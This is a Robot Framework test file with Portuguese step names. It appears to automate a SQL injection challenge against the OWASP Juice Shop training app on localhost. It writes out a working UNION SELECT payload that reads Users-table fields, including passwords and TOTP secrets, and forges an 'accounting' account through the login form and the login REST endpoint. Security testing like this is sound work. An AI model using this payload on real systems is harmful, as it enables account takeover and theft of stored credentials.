*** Settings ***
Resource    ../resource/settings.robot
*** Keywords ***
eu clico em conta para fazer login
    Click      ${home.button_account}
 eu clico em conectar
    Click       ${home.button_login}
eu preencho o campo com o email cadastrado via injeção SQL
    Fill Text        ${login.field_email}   ' UNION SELECT id,username,email,password,role,deluxeToken,lastLoginIp,profileImage,totpSecret,isActive,createdAt,updatedAt,deletedAt FROM Users UNION SELECT 1000, '', 'acc0unt4nt@juice-sh.op2', 'asdfasdf', 'accounting', '', '127.0.0.1', 'default.svg', '', 1, '2020-08-30 11:12:13', '2020-08-30 11:12:13', NULL;
eu preencho o campo com a senha cadastrada via injeção SQL
    Fill Text        ${login.field_password}    abcd1234
eu verifico se tenho acesso à conta efêmera
    Wait For Elements State    ${home.id_account_admin}     visible    timeout=30
eu clico no botão de login
    Click       ${login.button_login}
Generate Body
    [Arguments]    ${email}    ${password}
    ${body}=    Create Dictionary    email=${email}    password=${password}
    RETURN    ${body}
eu executo a consulta usando UNION para criar a conta de efêmera
    ${HEADER}=             Create Dictionary    Content-Type=application/json
    ${COLOR_REQUEST}=            Generate Body   ' UNION SELECT id,username,email,password,role,deluxeToken,lastLoginIp,profileImage,totpSecret,isActive,createdAt,updatedAt,deletedAt FROM Users UNION SELECT 1000, '', 'acc0unt4nt@juice-sh.op2', 'asdfasdf', 'accounting', '', '127.0.0.1', 'default.svg', '', 1, '2020-08-30 11:12:13', '2020-08-30 11:12:13', NULL;    1234
    ${response}=    POST    url=http://localhost:3000/rest/user/login      json=${COLOR_REQUEST}   expected_status=200    headers=${HEADER}    
    Set Global Variable    ${response}
eu verifico a criação da conta
    ${json}=    Set Variable    ${response.json()}
    Log To Console  ${json}
    Should Contain  ${json}    authentication
    Should Contain  ${json["authentication"]}    token